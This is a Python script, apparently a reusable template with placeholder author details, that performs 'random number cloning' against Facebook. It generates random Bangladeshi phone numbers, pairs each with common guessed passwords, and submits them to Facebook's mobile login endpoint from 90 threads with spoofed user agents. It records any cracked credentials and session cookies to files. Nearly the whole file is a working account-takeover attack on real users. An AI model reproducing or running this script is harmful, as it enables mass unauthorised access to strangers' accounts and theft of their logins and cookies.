#This Tool Make By MR.MIVI
#Github > MIVI404cyber

import os
import sys
import time
import json
import random
import re
import string
import platform
import base64
import uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')

os.system("clear")
os.system("xdg-open EXAMPLE_FB_ID_LINK")

class slw:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.1)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' 
m = '\x1b[1;91m' 
k = '\033[93m' 
xr = '\033[38;5;46m' 
hh = '\033[32m' 
u = '\033[95m'
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m'
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()


loop = 0
oks = []
cps = []

def line():
    print("\033[1;97m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><")

def clear():
    os.system("clear")
    baner= os.system("figlet -f slant LOGO_NAME")
    baner = str(baner)
    baner = baner.replace("0","")
    print(baner)
    line()
    print(" \033[1;37m[\033[38;5;46m+\033[1;37m] AUTHOR    :\033[1;92m EXAMPLE_NAME ")
    print(" \033[1;37m[\033[38;5;46m+\033[1;37m] WHATSAPP  : EX_WHATSAPP")
    print(" \033[1;37m[\033[38;5;46m+\033[1;37m] FACEBOOK  : FB_ID_NAME ")
    print(" \033[1;37m[\033[38;5;46m+\033[1;37m] GITHUB    : GITHUB_KINK ")
    print(" \033[1;37m[\033[38;5;46m+\033[1;37m] TOOL TYPE : EX_TTYPE ")
    print(" \033[1;37m[\033[38;5;46m+\033[1;37m] VERSION   : EX_VERSION ")
    line()

ugen2=[]
ugen=[]

for xd in range(10000):
    aa='Mozilla/5.0 (Linux; Android 12; Nokia C31 Build/SP1A.210812.016; wv)'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/413.0.0.30.104;]'
    fulagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(fulagnt)
    
def menu():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    clear()
    slw("\033[38;5;46mWELCOME TO EXAMPLE_NAME PROJECT")
    os.system("xdg-open GITHUB_LINK")
    clear()
    print(" \033[1;92m[\033[1;91m1\033[1;92m]\033[1;92m RANDOM NUMBER CLONING ")
    print(" \033[1;92m[\033[1;91m2\033[1;92m]\033[1;93m CONTACT ME ON FACEBOOK ")
    print(" \033[1;92m[\033[1;91m0\033[1;92m]\033[1;91m EXIT")
    line()
    usr=input("\n \033[38;5;195m[\033[38;5;46m+\033[38;5;195m] YOUR CHOICE : ")
    usr=usr.replace(" ","")
    if usr in ["1","01"]:
      pass
    elif usr in ["2","02"]:
      os.system("xdg-open EXAMPLE_FB_ID_LINK")
      sys.exit()
    elif usr in ["3","03"]:
      sys.exit()
    else:
      print("\n\033[38;5;195m [\033[38;5;196m!\033[38;5;195m]\033[38;5;196m WRONG OPTION ENTERED")
      time.sleep(1)
      menu()
    
    
    x1 = '017'
    x2 = '018'
    x3 = '019'
    x4 = '016'
    x5 = '015'
    code = random.choice([x1,x2,x3,x4,x5])
    clear()
    try:
      limit = int(input(' \033[38;5;195m[\033[38;5;46m+\033[38;5;195m] EXAMPLE : \033[38;5;46m 2000  5000  10000  50000\n\033[1;97m<><=><=><=><=><=><=><=><=><=><=><=><=><=><=><=><><\n\033[38;5;195m[\033[38;5;46m+\033[38;5;195m] CLONING LIMIT : '))
    except ValueError:
      limit=5000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    clear()
    passx = 0
    FARHANID = []
    print("")
    for I in range(passx):
        pww = 0
        FARHANID.append(pww)
    with ThreadPool(max_workers=90) as spd:
        clear()
        total = str(len(user))
        print(f'\033[38;5;195m[\033[38;5;195m+\033[38;5;195m]\033[38;5;195m TOTAL IDS : \033[38;5;46m'+total)
        print(f'\033[38;5;195m[\033[38;5;195m+\033[38;5;195m]\033[38;5;195m OK ID SAVED SHORT_NAME-OK.txt')
        print('\033[38;5;195m[+\033[38;5;195m] CP ID SAVED SHORT_NAME-CP.txt ')
        print('\033[38;5;195m[+] \x1b[38;5;208mUSE AEROPLANE MODE IN EVERY 5 MINUTES..')
        line()
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Akam in FARHANID:
                pwx.append(Akam)
                pwx.append(love)
                pwx.append("Bangladesh")
                pwx.append("bangladesh")
                pwx.append("i love you")
                pwx.append("free fire")
                pwx.append("iloveyou")
                pwx.append("freefire")
            spd.submit(rcrack,uid,pwx,total)
    print("\n\n THE PROCESS IS COMPLETED")
    os.system("xdg-open EXAMPLE_FB_ID_LINK")
def rcrack(uid,pwx,total):
    #print(user)
    global loop
    global cps
    global oks
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r \033[38;5;195m[SHORT_NAME-OK 🖤] \033[38;5;46m'+uid+'\033[38;5;195m | \033[38;5;46m' +ps+    '  \n\033[38;5;195m[COOKIE- 🍪\033[38;5;195m] = \033[38;5;46m'+coki+  '  ''  \033[0;97m')
                open('/sdcard/SHORT_NAME-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\033[38;5;195mSHORT_NAME-CP 💔 \x1b[38;5;208m' +uid+ ' \033[38;5;195m| '+'\x1b[38;5;208m '+ps+           '  \33[0;97m')
                open('/sdcard/SHORT_NAME-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x} \033[38;5;195m[{xr}SHORT_NAME-XD{x}]%s|%s]OK-{xr}%s{x}'%(H,loop,total,len(oks))),
        sys.stdout.flush()
    except:
        pass

menu()
